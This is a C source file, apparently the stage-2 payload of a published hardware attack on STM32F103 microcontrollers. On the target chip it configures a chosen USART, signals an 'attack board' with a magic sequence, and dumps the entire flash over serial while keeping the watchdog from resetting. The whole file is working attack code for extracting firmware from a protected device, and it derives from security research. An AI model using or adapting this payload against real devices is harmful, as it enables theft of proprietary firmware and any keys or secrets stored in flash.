/*
 * Authors: JohannesObermaier, Patrick Pedersen
 *
 * Target Firmware Version: 1.4
 *
 * Dumps the entire flash memory of the target board
 * and sends it over UART, where it is then received
 * by the attack board.
 *
 * This code is executed during stage 2 of the attack.
 *
 * The code provided here is a trimmed down version of the original
 * root shell code published here:
 * https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
 * It removes the root shell functionality and goes straight
 * to dumping once booted. It also fixes the dump endianness
 * and allows you to choose on which USART peripheral to dump.
 *
 * To select the USART, provide either of the following defines when compiling:
 * 	-D USE_USART1
 * 	-D USE_USART2
 * 	-D USE_USART3
 */

#include <stdint.h>

#define __IO volatile

uint8_t iwdg_enabled;
const char DUMP_START_MAGIC[] = {0x10, 0xAD, 0xDA, 0x7A};

//// Peripheral registers

#define _IWDG_KR (*(uint16_t *)0x40003000)
#define _WDG_SW (*(uint32_t *)0x1FFFF800 & 1UL << 16) // Page 20: https://www.st.com/resource/en/programming_manual/pm0075-stm32f10xxx-flash-memory-microcontrollers-stmicroelectronics.pdf

// RCC
#define RCC_APB1ENR (*(uint32_t *)0x4002101Cu)
#define RCC_APB2ENR (*(uint32_t *)0x40021018u)

// GPIO
typedef struct __attribute__((packed))
{
	__IO uint32_t CRL;
	__IO uint32_t CRH;
	__IO uint32_t IDR;
	__IO uint32_t ODR;
	__IO uint32_t BSRR;
	__IO uint32_t BRR;
	__IO uint32_t LCKR;
} GPIO;

#define GPIOA ((GPIO *)0x40010800u)
#define GPIOB ((GPIO *)0x40010C00u)

#define PIN_CONFIG_ALT_PUSH_PULL 0xB
#define PIN_CONFIG_INPUT_PULL_UP 0x8

// USART
typedef struct __attribute__((packed))
{
	__IO uint32_t SR;
	__IO uint32_t DR;
	__IO uint32_t BRR;
	__IO uint32_t CR1;
	__IO uint32_t CR2;
	__IO uint32_t CR3;
	__IO uint32_t GTPR;
} USART;

#define USART1 ((USART *)0x40013800u)
#define USART2 ((USART *)0x40004400u)
#define USART3 ((USART *)0x40004800u)

#define USARTDIV 0x00000341u	  // 9600 baud @ 8Mhz
#define USART_CR1_MSK 0x00002008u // 8-bit, no parity, enable TX

#define USART_SR_TXE (1 << 7)

volatile USART *usart;

#if defined(USE_USART1)

/* Intializes USART1
 * Returns the USART1 control register */
USART *init_usart1()
{
	/* Enable Clocks */
	RCC_APB2ENR |= (1 << 2);  // Input-Output Port A clock enable
	RCC_APB2ENR |= (1 << 14); // USART1 clock enable

	/* Configure Pins */

	// Set PA9 (TX) to alternate function push-pull
	GPIOA->CRH &= ~(0xF << 4);
	GPIOA->CRH |= (PIN_CONFIG_ALT_PUSH_PULL << 4);

	/* Configure and enable USART1 */
	USART1->BRR = USARTDIV;
	USART1->CR1 = USART_CR1_MSK;

	return USART1;
}

#elif defined(USE_USART2)

/* Intializes USART2
 * Returns the USART2 control register */
USART *init_usart2()
{
	/* Enable Clocks */
	RCC_APB2ENR |= (1 << 2);  // Input-Output Port A clock enable
	RCC_APB1ENR |= (1 << 17); // USART2 clock enable

	/* Configure Pins */

	// Set PA2 (TX) to alternate function push-pull
	GPIOA->CRL &= ~(0xF << 8);
	GPIOA->CRL |= (PIN_CONFIG_ALT_PUSH_PULL << 8);

	/* Configure and enable USART2 */
	USART2->BRR = USARTDIV;
	USART2->CR1 = USART_CR1_MSK;

	return USART2;
}

#elif defined(USE_USART3)

/* Intializes USART3
 * Returns the USART3 control register */
USART *init_usart3()
{
	/* Enable Clocks */
	RCC_APB2ENR |= (1 << 3);  // Input-Output Port B clock enable
	RCC_APB1ENR |= (1 << 18); // USART3 clock enable

	// Set PB10 (TX) to alternate function push-pull
	GPIOB->CRH &= ~(0xF << 8);
	GPIOB->CRH |= (PIN_CONFIG_ALT_PUSH_PULL << 8);

	/* Configure and enable USART3 */
	USART3->BRR = USARTDIV;
	USART3->CR1 = USART_CR1_MSK;

	return USART3;
}

#endif

void refresh_iwdg(void)
{
	if (iwdg_enabled)
	{
		_IWDG_KR = 0xAAAA;
	}
}
//// Printing

const uint8_t txtMap[] = "0123456789ABCDEF";

// Writes character to USART
void writeChar(uint8_t const chr)
{
	while (!(usart->SR & USART_SR_TXE))
	{
		refresh_iwdg(); // A byte takes ~1ms to be send at 9600, so there's plenty of time to reset the IWDG
				/* wait */
	}

	usart->DR = chr;
}

// Writes byte to USART
void writeByte(uint8_t b)
{
	writeChar(txtMap[b >> 4]);
	writeChar(txtMap[b & 0x0F]);
}

// Writes word to USART
void writeWord(uint32_t const word)
{
	writeChar((word & 0x000000FF));
	writeChar((word & 0x0000FF00) >> 8);
	writeChar((word & 0x00FF0000) >> 16);
	writeChar((word & 0xFF000000) >> 24);
}

// Writes string to USART
void writeStr(uint8_t const *const str)
{
	uint32_t ind = 0u;

	while (str[ind])
	{
		writeChar(str[ind]);
		++ind;
	}
}

//// Exception handling

/* Handles faults */
void alertCrash(uint32_t crashId)
{
	while (1)
	{
		refresh_iwdg(); // Keep refreshing IWDG to prevent reset
	}
}

//// Main

// Called by stage 2 in entry.S
int main(void)
{
	iwdg_enabled = (_WDG_SW == 0); // Check WDG_SW bit.
	refresh_iwdg();

	/* Init USART */
#if defined(USE_USART1)
	usart = init_usart1();
#elif defined(USE_USART2)
	usart = init_usart2();
#elif defined(USE_USART3)
	usart = init_usart3();
#else
#error "No USART selected"
#endif

	/* Print start magic to inform the attack board that
	   we are going to dump */
	for (uint32_t i = 0; i < sizeof(DUMP_START_MAGIC); i++)
	{
		writeChar(DUMP_START_MAGIC[i]);
	}

	uint32_t const *addr = (uint32_t *)0x08000000;
	while (((uintptr_t)addr) < (0x08000000U + (1024UL * 1024UL))) // Try dumping up to 1M. When reaching unimplemented memory, it will cause hard fault and stop.
	{
		writeWord(*addr);
		++addr;
	}

	while (1) // End
	{
		refresh_iwdg(); // Keep refreshing IWDG to prevent reset
	}
}
